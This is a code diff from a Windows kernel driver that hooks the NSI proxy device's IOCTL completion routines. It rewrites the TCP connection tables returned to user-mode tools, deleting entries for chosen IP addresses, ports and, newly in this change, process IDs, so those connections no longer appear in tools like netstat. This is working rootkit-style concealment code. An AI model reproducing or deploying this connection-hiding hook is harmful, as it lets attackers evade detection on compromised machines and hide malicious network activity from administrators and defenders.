@@ -66,8 +66,39 @@ BOOLEAN NsiHook::NetNSIFreeHook()
 }
 
 #if DBG
-static VOID PrintSocketAddr(ULONG localIP, USHORT localPort, ULONG foreignIP)
+// Declaration
+typedef PCHAR(*GET_PROCESS_IMAGE_NAME) (PEPROCESS Process);
+GET_PROCESS_IMAGE_NAME gGetProcessImageFileName;
+
+char* GetProcessNameFromPid(HANDLE pid)
 {
+	PEPROCESS Process;
+	if (PsLookupProcessByProcessId(pid, &Process) == STATUS_INVALID_PARAMETER)
+	{
+		return "pid???";
+	}
+	UNICODE_STRING sPsGetProcessImageFileName = RTL_CONSTANT_STRING(L"PsGetProcessImageFileName");
+	gGetProcessImageFileName = (GET_PROCESS_IMAGE_NAME)MmGetSystemRoutineAddress(&sPsGetProcessImageFileName);
+	// To use it
+	if (NULL != gGetProcessImageFileName)
+	{
+		PCHAR pImageName = gGetProcessImageFileName(Process);
+		return pImageName;
+	}
+	return "";
+}
+
+static VOID PrintTCPInformation(ULONG ProcessId, ULONG localIP, USHORT localPort, ULONG foreignIP)
+{
+	if(ProcessId)
+	{
+		DbgPrint("%PID[%ld]:%s\t", ProcessId, GetProcessNameFromPid((HANDLE)ProcessId));
+	}
+	else
+	{
+		DbgPrint("%PID[%ld]\t", ProcessId);
+	}
+
 	union
 	{
 		USHORT port;
@@ -112,40 +143,42 @@ NTSTATUS NsiHook::NetNSIProxyCompletionRoutineX86(
 		goto free_exit;
 	}
 
-#if DBG
 	if ((NsiParam->UnknownParam8 != 0x38))
 	{
-		KdPrint(("NetNSIProxyCompletionRoutine: NsiParam->UnknownParam8:[0x%x]\n", NsiParam->UnknownParam8));
+		goto free_exit;
 	}
-#endif
+
+	PINTERNAL_TCP_TABLE_ENTRY pTcpEntry = (PINTERNAL_TCP_TABLE_ENTRY)NsiParam->lpMem;
+	PNSI_STATUS_ENTRY pNsiStatusEntry = (PNSI_STATUS_ENTRY)NsiParam->lpStatus;
+	PNSI_PROCESSID_INFO  pNsiProcessIdInfo = (PNSI_PROCESSID_INFO)NsiParam->UnknownParam13;
+
+	DWORD numOfEntries = NsiParam->TcpConnCount;
 
 	KeStackAttachProcess(HookedContext->RequestingProcess, &ApcState);
-	PNSI_STATUS_ENTRY pStatusEntry = (PNSI_STATUS_ENTRY)NsiParam->lpStatus;
-	PINTERNAL_TCP_TABLE_ENTRY pTcpEntry = (PINTERNAL_TCP_TABLE_ENTRY)NsiParam->lpMem;
-	DWORD numOfEntries = NsiParam->TcpConnCount;
 	for (DWORD i = 0; i < numOfEntries; i++)
 	{
 #if DBG
-		PrintSocketAddr(pTcpEntry[i].localEntry.dwIP, pTcpEntry[i].localEntry.Port,
+		/* PrintSocketAddr(pTcpEntry[i].localEntry.dwIP, pTcpEntry[i].localEntry.Port,
+			pTcpEntry[i].remoteEntry.dwIP);	*/
+		PrintTCPInformation(pNsiProcessIdInfo[i].dwProcessId, pTcpEntry[i].localEntry.dwIP, pTcpEntry[i].localEntry.Port,
 			pTcpEntry[i].remoteEntry.dwIP);
 #endif
 
 		if (NetHook::NetIsHiddenIpAddress(pTcpEntry[i].localEntry.dwIP,
 			pTcpEntry[i].localEntry.Port,
-			pTcpEntry[i].remoteEntry.dwIP))
+			pTcpEntry[i].remoteEntry.dwIP, 
+			pNsiProcessIdInfo[i].dwProcessId))
 		{
-			// RtlZeroMemory(&pTcpEntry[i], sizeof(INTERNAL_TCP_TABLE_ENTRY));
-
 			// NSI will map status array entry to tcp table array entry
-			// we must modify both synchronously
+			// we must modify all synchronously
 			RtlCopyMemory(&pTcpEntry[i], &pTcpEntry[i + 1], sizeof(INTERNAL_TCP_TABLE_ENTRY) * (numOfEntries - i));
-			RtlCopyMemory(&pStatusEntry[i], &pStatusEntry[i + 1], sizeof(NSI_STATUS_ENTRY) * (numOfEntries - i));
+			RtlCopyMemory(&pNsiStatusEntry[i], &pNsiStatusEntry[i + 1], sizeof(NSI_STATUS_ENTRY) * (numOfEntries - i));
+			RtlCopyMemory(&pNsiProcessIdInfo[i], &pNsiProcessIdInfo[i + 1], sizeof(NSI_PROCESSID_INFO) * (numOfEntries - i));
 			numOfEntries--;
 			NsiParam->TcpConnCount--;
 			i--;
 		}
 	}
-
 	KeUnstackDetachProcess(&ApcState);
 
 free_exit:
@@ -180,7 +213,7 @@ NTSTATUS NsiHook::NetNSIProxyCompletionRoutine(
 	IN PDEVICE_OBJECT DeviceObject,
 	IN PIRP Irp,
 	IN PVOID Context)
-{
+{	
 	KAPC_STATE ApcState{};
 	PHOOKED_IO_COMPLETION HookedContext = (PHOOKED_IO_COMPLETION)Context;
 	if (!NT_SUCCESS(Irp->IoStatus.Status))
@@ -188,38 +221,48 @@ NTSTATUS NsiHook::NetNSIProxyCompletionRoutine(
 		goto free_exit;
 	}
 
-	PNSI_STRUCTURE_1 NsiParam = (PNSI_STRUCTURE_1)Irp->UserBuffer;
-	if (!MmIsAddressValid(NsiParam->Entries))
+	PNSI_PARAM_2 NsiParam = (PNSI_PARAM_2)Irp->UserBuffer;
+	if (!MmIsAddressValid(NsiParam->UnknownParam7))
 	{
 		goto free_exit;
 	}
 
-	if (NsiParam->EntrySize != sizeof(NSI_STRUCTURE_ENTRY))
+	if (NsiParam->UnknownParam8 != 0x38)
 	{
 		goto free_exit;
 	}
+
+	PINTERNAL_TCP_TABLE_ENTRY pTcpEntry = (PINTERNAL_TCP_TABLE_ENTRY)NsiParam->UnknownParam7;
+	PNSI_STATUS_ENTRY pNsiStatusEntry = (PNSI_STATUS_ENTRY)NsiParam->UnknownParam11;
+	PNSI_PROCESSID_INFO  pNsiProcessIdInfo = (PNSI_PROCESSID_INFO)NsiParam->UnknownParam13;
+
+	SIZE_T numOfEntries = NsiParam->ConnCount;
 
 	KeStackAttachProcess(HookedContext->RequestingProcess, &ApcState);
-	PINTERNAL_TCP_TABLE_ENTRY pTcpEntry = (PINTERNAL_TCP_TABLE_ENTRY)NsiParam->Entries;
 
-#if DBG
-	PNSI_STRUCTURE_ENTRY NsiBufferEntries = &(NsiParam->Entries->EntriesStart[0]);
-#endif 
-
-	SIZE_T numOfEntries = NsiParam->NumberOfEntries;	
 	for (SIZE_T i = 0; i < numOfEntries; i++)
 	{
 #if DBG
-		ASSERT(NsiBufferEntries[i].IpAddress == pTcpEntry[i].remoteEntry.dwIP);
-		PrintSocketAddr(pTcpEntry[i].localEntry.dwIP, pTcpEntry[i].localEntry.Port,
+		// ASSERT(NsiBufferEntries[i].IpAddress == pTcpEntry[i].remoteEntry.dwIP);
+		PrintTCPInformation(pNsiProcessIdInfo[i].dwProcessId, pTcpEntry[i].localEntry.dwIP, pTcpEntry[i].localEntry.Port,
 			pTcpEntry[i].remoteEntry.dwIP);
 #endif
 
 		if (NetHook::NetIsHiddenIpAddress(pTcpEntry[i].localEntry.dwIP,
 			pTcpEntry[i].localEntry.Port,
-			pTcpEntry[i].remoteEntry.dwIP))
+			pTcpEntry[i].remoteEntry.dwIP, 
+			pNsiProcessIdInfo[i].dwProcessId))
 		{
-			RtlZeroMemory(&pTcpEntry[i], sizeof(INTERNAL_TCP_TABLE_ENTRY));
+			// RtlZeroMemory(&pTcpEntry[i], sizeof(INTERNAL_TCP_TABLE_ENTRY));
+
+			// NSI will map status array entry to tcp table array entry
+			// we must modify all synchronously
+			RtlCopyMemory(&pTcpEntry[i], &pTcpEntry[i + 1], sizeof(INTERNAL_TCP_TABLE_ENTRY) * (numOfEntries - i));
+			RtlCopyMemory(&pNsiStatusEntry[i], &pNsiStatusEntry[i + 1], sizeof(NSI_STATUS_ENTRY) * (numOfEntries - i));
+			RtlCopyMemory(&pNsiProcessIdInfo[i], &pNsiProcessIdInfo[i + 1], sizeof(NSI_PROCESSID_INFO) * (numOfEntries - i));
+			numOfEntries--;
+			NsiParam->ConnCount--;
+			i--;
 		}
 	}
 
@@ -275,16 +318,12 @@ NTSTATUS NsiHook::NetNSIProxyDeviceControlHook(
 
 		IrpStack->Context = hook;		
 
-		if (IrpStack->Parameters.DeviceIoControl.InputBufferLength == sizeof(_NSI_STRUCTURE_1))
-		{
-			KdPrint(("InputBufferLength:[%lu] sizeof(NSI_STRUCTURE):[%zu]\n",
-				IrpStack->Parameters.DeviceIoControl.InputBufferLength, sizeof(_NSI_STRUCTURE_1)));
+		if (IrpStack->Parameters.DeviceIoControl.InputBufferLength == sizeof(NSI_PARAM_2))
+		{			
 			IrpStack->CompletionRoutine = NetNSIProxyCompletionRoutine;
 		}
 		else if (IrpStack->Parameters.DeviceIoControl.InputBufferLength == sizeof(NSI_PARAM))
 		{
-			KdPrint(("InputBufferLength:%lu sizeof(NSI_PARAM):%zu\n",
-				IrpStack->Parameters.DeviceIoControl.InputBufferLength, sizeof(NSI_PARAM)));
 			IrpStack->CompletionRoutine = NetNSIProxyCompletionRoutineX86;
 		}
 		else
